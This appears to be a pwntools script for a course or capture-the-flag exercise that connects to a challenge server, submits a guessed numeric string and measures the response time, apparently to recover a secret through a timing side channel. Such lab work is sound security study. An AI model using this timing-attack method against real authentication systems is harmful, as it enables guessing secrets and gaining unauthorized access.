from pwn import *
from datetime import datetime

i = 10

r = remote('cns.csie.org', 10224)

print(r.recvline())

s1 = r.recvline()
print(s1)
time1 = float(s1.decode()[-6:-1])
print(time1)

## enumerate through string ##
msg = '8604263255'
# ========================== #

print(msg)
r.sendline(msg)

for i in range(7):
    print(r.recvline())

s2 = r.recvline()
print(s2)
time2 = float(s2.decode()[-6:-1])
print(time2)

print("==================")
print("cost = ", time2-time1)
print("==================")

for i in range(3):
    print(r.recvline())
